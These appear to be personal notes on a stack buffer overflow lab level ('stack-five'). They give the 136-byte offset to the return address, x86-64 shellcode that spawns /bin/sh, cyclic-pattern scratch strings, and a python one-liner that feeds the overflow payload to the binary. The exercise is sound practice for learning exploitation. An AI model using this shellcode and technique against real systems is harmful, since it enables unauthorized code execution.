# Working on the problem
For this level the buffer is 128 bytes.
To do the traditional buffer overflow, you need get $rip = address of shellcode.
With this in mind 137 "A" characters gets control of the rip register.
This means 136 characters is the padding for the actual rip register.
# Creating the shellcode
The shellcode for this level simply runs /bin/sh.
To do this some very basic shellcode can be used.
```
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
```
# Scratch
0x7fffffffe620
acvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaega
acvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeea\xe6\xff\xff\xff\x7f\x00\x00
# Find the buffer before doing anything else
This will help when actually injecting the shellcode
Just point the ip to the buffer instead other weird addresses
## Current oneliner
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\x8d\x05@\x00")' | ./stack-five
```
